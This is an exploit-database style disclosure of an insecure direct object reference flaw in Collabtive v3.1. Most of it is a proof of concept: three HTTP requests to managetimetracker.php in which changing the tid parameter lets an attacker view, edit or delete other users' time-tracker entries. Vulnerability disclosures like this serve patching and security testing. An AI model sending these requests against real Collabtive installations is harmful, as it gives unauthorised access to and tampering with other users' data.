# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to view/update/delete the time tracker that owned by other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /managetimetracker.php?action=editform&tid=1(CHANGE HERE)&id=1 HTTP/1.1
```

```
POST /managetimetracker.php?action=edit&tid=1(CHANGE HERE)&id=1 HTTP/1.1
...

ttask=&day=21.12.2023&started=08%3A00&endday=21.12.2023&ended=09%3A00&comment=1111USER1&tid=&id=1
```

```
GET /managetimetracker.php?action=del&tid=1(CHANGE HERE)&id=1 HTTP/1.1
```